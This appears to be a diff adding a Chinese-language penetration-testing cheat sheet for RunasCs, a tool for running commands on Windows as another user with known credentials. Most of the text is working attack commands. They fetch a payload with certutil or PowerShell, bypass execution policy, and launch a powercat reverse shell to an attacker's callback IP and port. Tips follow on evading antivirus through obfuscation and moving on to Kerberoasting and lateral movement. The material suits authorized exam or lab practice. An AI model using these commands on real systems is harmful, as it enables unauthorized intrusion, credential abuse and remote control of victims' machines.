@@ -1,0 +1,65 @@
+项目地址：https://github.com/antonioCoco/RunasCs
+需要自行替换下面的账号密码
+>下载Invoke-RunasCs脚本（cmd）
+certutil -urlcache -split -f $downloadurl C:\windows\temp\$badfile
+>下载Invoke-RunasCs脚本（powershell）
+powershell -c "iwr -uri $downloadurl -outfile C:\windows\temp\$badfile"
+
+>加载脚本（powershell，绕过执行策略）
+powershell -ep bypass
+Import-Module C:\windows\temp\$badfile
+
+>测试凭证是否有效（执行whoami）
+Invoke-RunasCs -Username user -Password 'Password123!' -Command "cmd /c whoami"
+
+>获取一个user的cmd（交互测试）
+Invoke-RunasCs -Username user -Password 'Password123!' -Command cmd
+
+>【推荐】先下载反弹脚本（避免引号嵌套问题）
+certutil -urlcache -split -f $badurl/windows/Reversepowershell/powercat.ps1 C:\windows\temp\powercat.ps1
+
+>使用user执行反弹shell（powershell执行本地脚本）
+Invoke-RunasCs -Username user -Password 'Password123!' -Command "powershell -ep bypass -File C:\windows\temp\powercat.ps1 -c $callback_ip -p $callback_port -e powershell"
+
+>cmd环境下一步执行（无交互powershell时）
+powershell -ep bypass -File C:\windows\temp\$badfile -Username user -Password Password123! -Command "cmd /c whoami"
+
+###
+Invoke-RunasCs 用于在非交互shell环境中使用已知凭证执行命令（替代 runas）
+
+推荐流程：
+1. 先测试凭证（whoami）
+2. 再执行简单命令（cmd）
+3. 最后执行复杂payload（如反弹shell）
+
+为什么要分步：
+- 避免PowerShell多层引号解析错误
+- 提高成功率（考试/实战更稳）
+- 方便排错（知道卡在哪一步）
+
+常见问题：
+1. 执行策略限制：
+   powershell -ep bypass
+
+2. 登录失败（Logon failure）：
+   - 用户不允许交互登录
+   - 可尝试：-LogonType 8
+
+3. 权限受限提示：
+   Warning: logon is limited
+   解决：
+   Invoke-RunasCs -Username xxx -Password xxx -LogonType 8 -Command cmd
+
+4. 杀软拦截：
+   - RunasCs 很容易被拦
+   - 可考虑混淆或自编译
+
+5. 架构问题（x86 shell）：
+   使用：
+   C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe
+
+提示：
+- 强烈建议“下载 → 测试 → 执行payload”三步走
+- 不要一条命令直接反弹（容易失败且难排错）
+- 成功切换用户后可继续 Kerberoast / 横向移动
+###
